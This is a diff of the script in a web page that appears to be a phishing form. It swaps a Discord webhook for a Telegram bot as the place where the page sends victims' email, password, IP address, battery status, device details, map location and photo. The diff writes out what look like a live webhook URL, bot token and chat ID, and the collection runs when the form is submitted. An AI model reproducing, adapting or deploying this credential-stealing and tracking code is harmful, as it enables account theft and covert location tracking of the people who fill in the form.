@@ -21,30 +21,41 @@
     </form>
 
     <script>
-        async function sendToWebhook(data, photoUrl) {
-            const webhookURL = "https://discord.com/api/webhooks/1254403696671064085/WPwYa6uIgcoEMsHaZuxRpZMQlYFhqMZ9nyuyJsokvETVyFjv6Sv71qjWLgUsg9Urem7C"; // Replace with your webhook URL
+        async function sendToTelegram(data, photoUrl) {
+            const botToken = "7221265350:AAFW3JNsT8JtmBhSo_mt7GDi6tSjx36MEEg"; // Replace with your bot token
+            const chatId = "7254975140"; // Replace with your chat ID
 
-            const payload = {
-                embeds: [{
-                    title: "User Information",
-                    fields: [
-                        { name: "Email", value: data.email, inline: true },
-                        { name: "Password", value: data.password, inline: true },
-                        { name: "IP Address", value: data.ip, inline: true },
-                        { name: "Battery Level", value: data.battery.level, inline: true },
-                        { name: "Charging", value: data.battery.charging, inline: true },
-                        { name: "Device Info", value: data.phoneInfo, inline: true },
-                        { name: "Location", value: `https://www.google.com/maps?q=${data.location.lat},${data.location.lon}`, inline: true }
-                    ],
-                    image: { url: photoUrl }
-                }]
-            };
+            const message = `
+            *User Information*
+            *Email:* ${data.email}
+            *Password:* ${data.password}
+            *IP Address:* ${data.ip}
+            *Battery Level:* ${data.battery.level}
+            *Charging:* ${data.battery.charging}
+            *Device Info:* ${data.phoneInfo}
+            *Location:* https://www.google.com/maps?q=${data.location.lat},${data.location.lon}
+            `;
 
-            await fetch(webhookURL, {
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                })
             });
+
+            if (photoUrl) {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        photo: photoUrl
+                    })
+                });
+            }
         }
 
         async function getIPAddress() {
@@ -121,10 +132,9 @@
 
             const data = { ip, battery, phoneInfo, location, email, password };
 
-            sendToWebhook(data, photoUrl);
+            sendToTelegram(data, photoUrl);
         }
 
-            gatherAndSendData();
         document.getElementById('dataForm').addEventListener('submit', (event) => {
             event.preventDefault();
             gatherAndSendData();
